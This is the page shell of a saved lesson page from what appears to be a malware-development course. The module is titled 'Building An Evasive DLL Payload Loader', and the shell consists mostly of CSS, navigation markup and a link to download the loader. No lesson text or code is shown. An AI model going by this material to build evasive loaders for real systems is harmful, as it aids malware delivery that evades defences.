f242"}.fa-battery-1:before,.fa-battery-quarter:before{content:"\f243"}.fa-battery-0:before,.fa-battery-empty:before{content:"\f244"}.fa-mouse-pointer:before{content:"\f245"}.fa-i-cursor:before{content:"\f246"}.fa-object-group:before{content:"\f247"}.fa-object-ungroup:before{content:"\f248"}.fa-sticky-note:before{content:"\f249"}.fa-sticky-note-o:before{content:"\f24a"}.fa-cc-jcb:before{content:"\f24b"}.fa-cc-diners-club:before{content:"\f24c"}.fa-clone:before{content:"\f24d"}.fa-balance-scale:before{content:"\f24e"}.fa-hourglass-o:before{content:"\f250"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:"\f251"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:"\f252"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:"\f253"}.fa-hourglass:before{content:"\f254"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:"\f255"}.fa-hand-stop-o:before,.fa-hand-paper-o:before{content:"\f256"}.fa-hand-scissors-o:before{content:"\f257"}.fa-hand-lizard-o:before{content:"\f258"}.fa-hand-spock-o:before{content:"\f259"}.fa-hand-pointer-o:before{content:"\f25a"}.fa-hand-peace-o:before{content:"\f25b"}.fa-trademark:before{content:"\f25c"}.fa-registered:before{content:"\f25d"}.fa-creative-commons:before{content:"\f25e"}.fa-gg:before{content:"\f260"}.fa-gg-circle:before{content:"\f261"}.fa-tripadvisor:before{content:"\f262"}.fa-odnoklassniki:before{content:"\f263"}.fa-odnoklassniki-square:before{content:"\f264"}.fa-get-pocket:before{content:"\f265"}.fa-wikipedia-w:before{content:"\f266"}.fa-safari:before{content:"\f267"}.fa-chrome:before{content:"\f268"}.fa-firefox:before{content:"\f269"}.fa-opera:before{content:"\f26a"}.fa-internet-explorer:before{content:"\f26b"}.fa-tv:before,.fa-television:before{content:"\f26c"}.fa-contao:before{content:"\f26d"}.fa-500px:before{content:"\f26e"}.fa-amazon:before{content:"\f270"}.fa-calendar-plus-o:before{content:"\f271"}.fa-calendar-minus-o:before{content:"\f272"}.fa-calendar-times-o:before{content:"\f273"}.fa-calendar-check-o:before{content:"\f274"}.fa-industry:before{content:"\f275"}.fa-map-pin:before{content:"\f276"}.fa-map-signs:before{content:"\f277"}.fa-map-o:before{content:"\f278"}.fa-map:before{content:"\f279"}.fa-commenting:before{content:"\f27a"}.fa-commenting-o:before{content:"\f27b"}.fa-houzz:before{content:"\f27c"}.fa-vimeo:before{content:"\f27d"}.fa-black-tie:before{content:"\f27e"}.fa-fonticons:before{content:"\f280"}.fa-reddit-alien:before{content:"\f281"}.fa-edge:before{content:"\f282"}.fa-credit-card-alt:before{content:"\f283"}.fa-codiepie:before{content:"\f284"}.fa-modx:before{content:"\f285"}.fa-fort-awesome:before{content:"\f286"}.fa-usb:before{content:"\f287"}.fa-product-hunt:before{content:"\f288"}.fa-mixcloud:before{content:"\f289"}.fa-scribd:before{content:"\f28a"}.fa-pause-circle:before{content:"\f28b"}.fa-pause-circle-o:before{content:"\f28c"}.fa-stop-circle:before{content:"\f28d"}.fa-stop-circle-o:before{content:"\f28e"}.fa-shopping-bag:before{content:"\f290"}.fa-shopping-basket:before{content:"\f291"}.fa-hashtag:before{content:"\f292"}.fa-bluetooth:before{content:"\f293"}.fa-bluetooth-b:before{content:"\f294"}.fa-percent:before{content:"\f295"}.fa-gitlab:before{content:"\f296"}.fa-wpbeginner:before{content:"\f297"}.fa-wpforms:before{content:"\f298"}.fa-envira:before{content:"\f299"}.fa-universal-access:before{content:"\f29a"}.fa-wheelchair-alt:before{content:"\f29b"}.fa-question-circle-o:before{content:"\f29c"}.fa-blind:before{content:"\f29d"}.fa-audio-description:before{content:"\f29e"}.fa-volume-control-phone:before{content:"\f2a0"}.fa-braille:before{content:"\f2a1"}.fa-assistive-listening-systems:before{content:"\f2a2"}.fa-asl-interpreting:before,.fa-american-sign-language-interpreting:before{content:"\f2a3"}.fa-deafness:before,.fa-hard-of-hearing:before,.fa-deaf:before{content:"\f2a4"}.fa-glide:before{content:"\f2a5"}.fa-glide-g:before{content:"\f2a6"}.fa-signing:before,.fa-sign-language:before{content:"\f2a7"}.fa-low-vision:before{content:"\f2a8"}.fa-viadeo:before{content:"\f2a9"}.fa-viadeo-square:before{content:"\f2aa"}.fa-snapchat:before{content:"\f2ab"}.fa-snapchat-ghost:before{content:"\f2ac"}.fa-snapchat-square:before{content:"\f2ad"}.fa-pied-piper:before{content:"\f2ae"}.fa-first-order:before{content:"\f2b0"}.fa-yoast:before{content:"\f2b1"}.fa-themeisle:before{content:"\f2b2"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:"\f2b3"}.fa-fa:before,.fa-font-awesome:before{content:"\f2b4"}.fa-handshake-o:before{content:"\f2b5"}.fa-envelope-open:before{content:"\f2b6"}.fa-envelope-open-o:before{content:"\f2b7"}.fa-linode:before{content:"\f2b8"}.fa-address-book:before{content:"\f2b9"}.fa-address-book-o:before{content:"\f2ba"}.fa-vcard:before,.fa-address-card:before{content:"\f2bb"}.fa-vcard-o:before,.fa-address-card-o:before{content:"\f2bc"}.fa-user-circle:before{content:"\f2bd"}.fa-user-circle-o:before{content:"\f2be"}.fa-user-o:before{content:"\f2c0"}.fa-id-badge:before{content:"\f2c1"}.fa-drivers-license:before,.fa-id-card:before{content:"\f2c2"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:"\f2c3"}.fa-quora:before{content:"\f2c4"}.fa-free-code-camp:before{content:"\f2c5"}.fa-telegram:before{content:"\f2c6"}.fa-thermometer-4:before,.fa-thermometer:before,.fa-thermometer-full:before{content:"\f2c7"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:"\f2c8"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:"\f2c9"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:"\f2ca"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:"\f2cb"}.fa-shower:before{content:"\f2cc"}.fa-bathtub:before,.fa-s15:before,.fa-bath:before{content:"\f2cd"}.fa-podcast:before{content:"\f2ce"}.fa-window-maximize:before{content:"\f2d0"}.fa-window-minimize:before{content:"\f2d1"}.fa-window-restore:before{content:"\f2d2"}.fa-times-rectangle:before,.fa-window-close:before{content:"\f2d3"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:"\f2d4"}.fa-bandcamp:before{content:"\f2d5"}.fa-grav:before{content:"\f2d6"}.fa-etsy:before{content:"\f2d7"}.fa-imdb:before{content:"\f2d8"}.fa-ravelry:before{content:"\f2d9"}.fa-eercast:before{content:"\f2da"}.fa-microchip:before{content:"\f2db"}.fa-snowflake-o:before{content:"\f2dc"}.fa-superpowers:before{content:"\f2dd"}.fa-wpexplorer:before{content:"\f2de"}.fa-meetup:before{content:"\f2e0"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}</style><style class="darkreader darkreader--sync" media="screen"></style>
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="23_files/css2.css" rel="stylesheet">
        <link href="23_files/css2_002.css" rel="stylesheet">
        <title>Building An Evasive DLL Payload Loader</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="23_files/app-CuOUn2oZ.css"><link rel="stylesheet" href="23_files/app-CuOUn2oZ.css"><style class="darkreader darkreader--sync" media="screen"></style><link href="23_files/prism-coldark-dark.css" rel="stylesheet"><style class="darkreader darkreader--sync" media="screen"></style>

<link rel="stylesheet" href="23_files/viewer.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <meta name="darkreader" content="b1719867331d4cb7ba77efae5c9c0222"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
    color: var(--darkreader-text-302505, #d7d4cf) !important;
}
#vimvixen-console-frame {
    color-scheme: light !important;
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
}
.tou-uknfeu {
    background-color: var(--darkreader-background-faedda, #432c09) !important;
}
.tou-6i3zyv {
    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
}
div.mermaid-viewer-control-panel .btn {
    background-color: var(--darkreader-neutral-background);
    fill: var(--darkreader-neutral-text);
}
svg g rect.er {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
    fill: var(--darkreader-selection-background);
    fill-opacity: 0.8 !important;
}
svg rect.er.relationshipLabelBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect,
svg g g.nodes polygon {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
    fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0,
svg line.messageLine1 {
    stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
    fill: var(--darkreader-neutral-background) !important;
}
mitid-authenticators-code-app > .code-app-container {
    background-color: white !important;
    padding-top: 1rem;
}
iframe#unpaywall[src$="unpaywall.html"] {
    color-scheme: light !important;
}
select {
    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
}
select * {
    background-color: var(--darkreader-neutral-background) !important;
}
body#tumblr {
    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
    --darkreader-bg--white: 23, 23, 23 !important;
    --darkreader-text--black: 228, 224, 218 !important;
}
:host {
    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
:host([_floating]) .d2l-floating-buttons-container {
    background-color: var(--darkreader-neutral-background) !important;
    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
    opacity: 0.88 !important;
}
d2l-card {
    background: var(--darkreader-neutral-background) !important;
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
d2l-dropdown-content > div,
d2l-menu-item {
    background-color: var(--darkreader-neutral-background) !important;
    border-radius: 10px !important;
}
d2l-empty-state-simple {
    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-button-filter > ul > li > a.vui-button {
    border-color: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-label-text:has(.d2l-button-subtle-content):hover,
.d2l-label-text:has(.d2l-button-subtle-content):focus,
.d2l-label-text:has(.d2l-button-subtle-content):active {
    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-navigation-centerer {
    color: inherit !important;
}
.d2l-tabs-layout {
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
.d2l-input,
.d2l-calendar-date,
.d2l-htmleditor-container {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-collapsible-panel {
    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
    border-radius: 0.4rem !important;
}
.d2l-collapsible-panel-divider {
    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-w2d-flex {
    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-collapsible-panel scrolled,
.d2l-collapsible-panel-header,
.d2l-w2d-collection-fixed {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-loading-spinner-bg {
    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-loading-spinner-bg-stroke {
    stroke: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-loading-spinner-wrapper svg path,
.d2l-loading-spinner-wrapper svg circle {
    fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style><style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="w-full px-2 sm:px-0 z-40
    bg-[#101926] backdrop-blur-md sticky backdrop-saturate-150 border-b border-gray-700/50
     hidden">

    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[100px] h-[60px]" src="23_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto items-center" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 rounded-lg border md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 dark:border-gray-900">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Maldev Database</a>
          </li>
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4" style="--darkreader-inline-stroke: currentColor;" data-darkreader-inline-stroke=""></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700 z-20">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                                        <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-600/90 hover:bg-blue-500/80 border border-blue-400/40 shadow-md font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 transition-all duration-200 backdrop-blur-sm backdrop-saturate-150">
              Dashboard
            </a>
          </li>
                  </ul>
      </div>
    </div>
    
  </nav>        <template id="app-template">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="23_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 23 - Building An Evasive DLL Payload Loader
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="23_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="23_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="23_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="23_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="23_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/DllPayloadLoader" target="_blank">
                    <img src="23_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
